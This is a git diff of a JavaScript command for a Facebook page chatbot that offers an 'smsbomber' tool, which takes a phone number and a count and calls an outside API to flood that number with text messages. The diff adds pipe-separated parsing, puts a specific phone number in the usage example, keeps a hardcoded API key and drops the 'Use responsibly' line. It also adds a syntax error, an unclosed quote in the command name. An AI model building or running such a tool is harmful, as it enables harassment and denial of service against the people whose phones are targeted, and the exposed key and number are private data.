@@ -2,8 +2,8 @@ const axios = require('axios');
 const { sendMessage } = require('../handles/sendMessage');
 
 module.exports = {
-    name: ['smsbomber'],
-    usage: 'smsbomber [phone] [amount]',
+    name: ['smsbomb],
+    usage: 'smsbomber [phone] | [amount]',
     version: '1.0.0',
     author: 'AutoPageBot',
     category: 'tools',
@@ -12,12 +12,23 @@ module.exports = {
     async execute(senderId, args, pageAccessToken) {
         // Check if phone number and amount are provided
         if (args.length < 2) {
-            await sendMessage(senderId, { text: '❌ Usage: smsbomber [phone] [amount]\nExample: smsbomber 123456789 | 5' }, pageAccessToken);
+            await sendMessage(senderId, { text: '❌ Usage: smsbomber [phone] | [amount]\nExample: smsbomber 09979939317 | 5' }, pageAccessToken);
             return;
         }
 
-        const phone = args[0];
-        const amount = parseInt(args[1]);
+        // Parse args with | separator
+        let phone, amount;
+        const separatorIndex = args.findIndex(arg => arg === '|');
+        
+        if (separatorIndex !== -1) {
+            phone = args.slice(0, separatorIndex).join(' ');
+            amount = parseInt(args[separatorIndex + 1]);
+        } else {
+            // Fallback to traditional format
+            phone = args[0];
+            amount = parseInt(args[1]);
+        }
+
         const apiKey = '79d08d76a3deae3fae1c7637141db818ec02faf1e3597e302c4ed9e1d5211d89';
 
         // Validate amount
@@ -36,7 +47,7 @@ module.exports = {
             });
 
             if (response.data.success) {
-                const message = `✅ ${response.data.message}\n\n📱 Target: ${phone}\n🔢 Amount: ${amount}\n💬 Status: SMS bombing initiated successfully! | Use responsibly`;
+                const message = `✅ ${response.data.message}\n\n📱 Target: ${phone} | 🔢 Amount: ${amount}\n💬 Status: SMS bombing initiated successfully!`;
                 await sendMessage(senderId, { text: message }, pageAccessToken);
             } else {
                 await sendMessage(senderId, { text: '❌ Failed to start SMS bombing. Please try again later.' }, pageAccessToken);
